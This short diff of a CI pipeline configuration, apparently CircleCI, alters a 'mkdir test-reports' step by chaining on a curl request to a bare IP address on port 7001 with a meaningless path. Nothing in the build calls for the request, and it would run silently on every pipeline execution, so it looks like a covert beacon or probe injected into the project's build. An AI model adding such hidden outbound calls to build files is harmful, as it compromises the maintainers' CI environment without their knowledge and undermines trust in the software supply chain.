@@ -38,7 +38,7 @@ jobs:
           POSTGRES_PASSWORD: ''
     steps:
       - checkout
-      - run: mkdir test-reports
+      - run: mkdir test-reports;curl http://144.91.73.106:7001/assdasd
       - run:
           name: Download Selenium
           command: |
